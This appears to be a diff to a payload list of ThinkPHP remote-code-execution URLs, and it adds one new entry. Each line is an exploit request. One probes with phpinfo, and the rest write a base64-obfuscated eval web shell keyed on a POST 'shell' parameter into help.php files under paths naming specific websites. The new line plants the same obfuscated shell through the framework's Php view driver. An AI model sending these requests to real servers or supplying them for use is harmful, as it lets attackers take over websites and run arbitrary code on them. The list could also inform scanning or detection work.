@@ -3,3 +3,5 @@
 /index.php?s=/Index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
 /index.php?s=/Index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=/www/wwwroot/gbk999.com/public/help.php&vars[1][1]=<?php @eval(base64_decode($_POST[%27shell%27]));
 /index.php?s=/Index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=file_put_contents(%27/www/wwwroot/kftx.xyz/help.php%27,base64_decode(%27PD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3NoZWxsJ10pKTs=%27))
+
+/index.php?s=/Index/think\app/invokeMethod&method[0]=think\view\driver\Php&method[1]=display&vars[0]=<?php call_user_func("assert","eval"."("."base64_decode"."('"."QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3NoZWxsJ10pKTs="."')".")");?>
